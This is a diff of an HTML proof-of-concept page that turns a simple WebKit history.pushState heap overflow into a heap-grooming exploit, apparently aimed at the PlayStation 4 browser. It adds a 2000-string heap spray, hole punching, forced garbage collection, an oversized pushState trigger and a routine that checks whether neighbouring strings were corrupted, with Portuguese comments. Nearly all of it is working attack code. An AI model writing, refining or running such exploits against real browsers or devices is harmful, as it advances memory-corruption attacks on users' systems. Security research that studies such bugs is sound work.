@@ -2,72 +2,138 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>WebKit Heap Overflow</title>
+    <title>PS4 WebKit Heap Corruption Proof</title>
+    <style>
+        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; }
+        .log-entry { border-bottom: 1px solid #333; padding: 2px; }
+        .success { color: #ff0000; font-weight: bold; font-size: 1.2em; }
+    </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Vulnerability: Heap-Based Buffer Overflow in history.pushState</h2>
-    <p><strong>Technical Description:</strong> This Proof of Concept demonstrates an Out-Of-Bounds (OOB) Write primitive in the WebKit Heap.</p>
-    <p>By supplying a payload exceeding the internal buffer allocation logic, we can overwrite adjacent heap chunks with controlled data (0x01 bytes).</p>
-    
-    <ul>
-        <li><strong>Allocation Target:</strong> ~709KB (Base String)</li>
-        <li><strong>Overflow Size:</strong> ~340KB (Controlled 0x01 bytes)</li>
-        <li><strong>Trigger:</strong> Invalid write at memory boundary (0x41414141)</li>
-    </ul>
-
-    <button class="btn" onclick="executePoC()">Trigger Memory Corruption</button>
-    
-    <div id="log"></div>
-</div>
+<h2>WebKit Heap Grooming & Corruption PoC</h2>
+<p>Status: <span id="status">Waiting to start...</span></p>
+<button onclick="runExploit()">INICIAR TESTE DE CORRUPÇÃO</button>
+<div id="log"></div>
 
 <script>
-    function log(msg) {
+    // CONFIGURAÇÃO TÉCNICA
+    // O tamanho do payload vulnerável é ~709KB.
+    // Precisamos de vítimas de tamanho similar para cair no mesmo 'Heap Bucket'.
+    // 0x100000 bytes = 1MB. WebKit alinha alocações grandes.
+    const VICTIM_SIZE = 0x80000; // 524KB (Tentativa de alinhar com o payload de 709KB)
+    const SPRAY_COUNT = 2000;    // Quantidade de objetos para encher a memória
+    
+    var victims = new Array(SPRAY_COUNT);
+    var exploit_str = ""; 
+
+    function log(msg, type="") {
         const el = document.getElementById('log');
-        el.innerHTML += `<div>> ${msg}</div>`;
-        el.scrollTop = el.scrollHeight;
+        el.innerHTML = `<div class="log-entry ${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>` + el.innerHTML;
     }
 
-    function executePoC() {
-        log("Initializing payload generation...");
+    function createVictimString(len, index) {
+        // Cria uma string reconhecível: "BBBB...[index]"
+        // O index no final nos ajuda a saber QUAL vítima foi atingida
+        var s = new Uint8Array(len);
+        s.fill(0x42); // 'B'
+        // Marcador no final
+        var idxStr = index.toString();
+        for(let i=0; i<idxStr.length; i++) {
+            s[len - idxStr.length + i] = idxStr.charCodeAt(i);
+        }
+        return new TextDecoder().decode(s);
+    }
 
-        setTimeout(() => {
-            try {
-                // STEP 1: Fill the legitimate buffer
-                // This fills the allocated chunk up to the vulnerable boundary (709,522 bytes).
-                const BUFFER_LIMIT = 709522;
-                const baseBuffer = "A".repeat(BUFFER_LIMIT);
-                log(`Base buffer created: ${BUFFER_LIMIT} bytes.`);
+    // Passo 1: Heap Spray (Encher a memória)
+    function heapSpray() {
+        log(`Iniciando Spray de ${SPRAY_COUNT} objetos de ${VICTIM_SIZE} bytes...`);
+        for (let i = 0; i < SPRAY_COUNT; i++) {
+            victims[i] = createVictimString(VICTIM_SIZE, i);
+        }
+        log("Heap preenchido. Memória alinhada.");
+    }
 
-                // STEP 2: The Controlled Overflow (The "Write Primitive")
-                // We use 0x01 bytes because they bypass the character filter check.
-                // This proves we can write ~340KB beyond the intended buffer without crashing immediately.
-                // This targets the 1MB Heap Bucket size class.
-                const OOB_SIZE = 340000; 
-                const controlledOverflow = "\x01".repeat(OOB_SIZE);
-                log(`Generating OOB Payload: ${OOB_SIZE} bytes of controlled data (0x01)...`);
+    // Passo 2: Hole Punching (Criar buracos para a vulnerabilidade cair dentro)
+    function punchHoles() {
+        log("Criando buracos (Holes) no Heap...");
+        // Liberamos objetos alternados no final do array (onde a alocação é mais estável)
+        // Liberamos 1 a cada 2 objetos para criar o padrão: [VÍTIMA] [BURACO] [VÍTIMA]
+        // Se o history.pushState cair no [BURACO], ele transborda para a [VÍTIMA] seguinte.
+        for (let i = SPRAY_COUNT - 500; i < SPRAY_COUNT; i += 2) {
+            victims[i] = null;
+        }
+        log("Buracos criados. Forçando Garbage Collection...");
+        
+        // Força o WebKit a limpar a memória e consolidar os buracos
+        for(let k=0; k<100; k++) { new ArrayBuffer(0x10000); }
+    }
 
-                // STEP 3: Corruption Trigger
-                // Writing 0x41 ('A') at the very end forces the allocator to process the 
-                // corrupted heap metadata created by Step 2, resulting in a system panic.
-                const corruptionTrigger = "AAAA"; 
+    // Passo 3: O Gatilho Vulnerável
+    function triggerVuln() {
+        log("Disparando history.pushState no buraco preparado...");
+        
+        // Payload Original Ajustado
+        const BUFFER_LIMIT = 709522; 
+        const OOB_SIZE = 100000; // Reduzido para evitar crash imediato do sistema, queremos apenas tocar a vizinha
+        
+        const baseBuffer = "A".repeat(BUFFER_LIMIT);
+        // Usamos 0x01 (SOH) como byte de corrupção
+        const controlledOverflow = "\x01".repeat(OOB_SIZE); 
+        
+        const finalPayload = "/" + baseBuffer + controlledOverflow;
 
-                // Assemble the full payload
-                const finalPayload = "/" + baseBuffer + controlledOverflow + corruptionTrigger;
+        try {
+            history.pushState({}, "poc", finalPayload);
+            log("Payload enviado. Verificando danos...");
+            checkCorruption();
+        } catch(e) {
+            log("Erro no trigger (pode ser bom se for crash controlado): " + e.message);
+        }
+    }
+
+    // Passo 4: Verificação (A prova real)
+    function checkCorruption() {
+        let corrupted = false;
+        // Varre as vítimas que SOBRARAM (as vizinhas dos buracos)
+        for (let i = SPRAY_COUNT - 500; i < SPRAY_COUNT; i++) {
+            if (victims[i] !== null) {
+                let v = victims[i];
                 
-                log(`Injecting total payload (${finalPayload.length} bytes) via history.pushState...`);
-                log("Executing... Expect system instability due to heap corruption.");
+                // VERIFICAÇÃO 1: O comprimento mudou?
+                // Se sobrescrevemos o cabeçalho, o tamanho pode ficar gigante ou zero
+                if (v.length !== VICTIM_SIZE) {
+                    log(`SUCESSO CRÍTICO! Vítima [${i}] comprimento alterado!`, "success");
+                    log(`Esperado: ${VICTIM_SIZE}, Encontrado: ${v.length}`, "success");
+                    corrupted = true;
+                    break;
+                }
 
-                // EXECUTE
-                history.pushState({}, "poc", finalPayload);
-                
-            } catch (e) {
-                log(`Error: ${e.message}`);
+                // VERIFICAÇÃO 2: O conteúdo mudou?
+                // Verifica se os primeiros bytes viraram 0x01 (nosso payload) ou 'A'
+                //charCodeAt(0) deveria ser 0x42 ('B')
+                if (v.charCodeAt(0) !== 0x42) { 
+                    log(`SUCESSO! Conteúdo da Vítima [${i}] corrompido!`, "success");
+                    log(`Byte encontrado: ${v.charCodeAt(0)} (Esperado 66/0x42)`, "success");
+                    corrupted = true;
+                    break;
+                }
             }
-        }, 500);
-    }
-</script>
+        }
 
+        if (!corrupted) {
+            log("Falha: Nenhuma vítima foi atingida. Tente ajustar o VICTIM_SIZE.");
+            log("O payload caiu em uma região de memória isolada.");
+        }
+    }
+
+    function runExploit() {
+        document.getElementById('status').innerText = "Running...";
+        setTimeout(heapSpray, 100);
+        setTimeout(punchHoles, 2000);
+        setTimeout(triggerVuln, 4000);
+    }
+
+</script>
 </body>
 </html>
